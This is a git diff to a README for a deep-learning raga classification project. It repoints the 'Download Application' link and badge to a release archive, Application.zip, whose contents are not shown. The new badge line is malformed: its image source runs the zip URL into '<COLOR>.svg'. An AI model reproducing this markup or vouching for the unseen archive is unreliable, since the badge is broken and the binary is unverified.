@@ -20,11 +20,11 @@ The primary focus of this project is to leverage deep learning algorithms to acc
 - Raga Classification
 
 ## How to Access the Application
-To access the project application, please download it from the following link: [Download Application](https://github.com/file/Application.zip). Once downloaded, unzip the file and follow the instructions provided in the README to launch the application successfully.
+To access the project application, please download it from the following link: [Download Application](https://github.com/Heiviin/Raga-Classification-using-Deep-Learning/releases/download/v1.0.0/Application.zip). Once downloaded, unzip the file and follow the instructions provided in the README to launch the application successfully.
 
 If you encounter any issues with the provided link or it is not accessible, please check the "Releases" section of this repository for alternative download options.
 
-[![Download Application](https://img.shields.io/badge/Download-Application-<COLOR>.svg)](https://github.com/file/Application.zip)
+[![Download Application](https://github.com/Heiviin/Raga-Classification-using-Deep-Learning/releases/download/v1.0.0/Application.zip<COLOR>.svg)](https://github.com/Heiviin/Raga-Classification-using-Deep-Learning/releases/download/v1.0.0/Application.zip)
 
 ## Conclusion
 Delve into the intricate world of Indian classical music and explore the art of raga classification using cutting-edge deep learning techniques. Join us on this musical journey as we unravel the secrets of ragas and push the boundaries of AI in music classification.
